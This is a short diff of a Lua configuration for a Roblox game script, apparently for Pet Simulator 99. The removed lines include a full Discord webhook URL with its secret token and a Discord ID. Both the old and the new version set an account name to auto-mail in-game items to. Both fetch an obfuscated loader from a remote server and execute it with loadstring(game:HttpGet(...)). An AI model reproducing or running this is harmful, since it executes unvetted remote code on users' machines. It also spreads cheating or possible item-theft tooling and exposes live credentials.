@@ -1,11 +1,4 @@
-getgenv().ps99Config = {
-    -- General Config
-    WEBHOOK_URL = "https://discord.com/api/webhooks/1000430823742382080/Pl17KV4Z4Y3oRXOt6OqzvikI5nUL7Cs7L6jdnzHdC-q2VfcqPe7tLuQX1DD89An_rMAF",
-    DISCORD_ID = "789192982980591626",
-
-    -- Mail Config
-    USERNAME_TO_MAIL = "itsyoursboialt51",
-    MAILING_WEBHOOK_URL = "",
+getgenv().Config = {
+    ["AutoMailUser"] = "itsyoursboialt51",
 }
-
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/e1bd7cc383131e1bc6313c712409ee7d.lua"))()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/ea0ab6ccca282c76c23a12244973ad4e.lua"))()
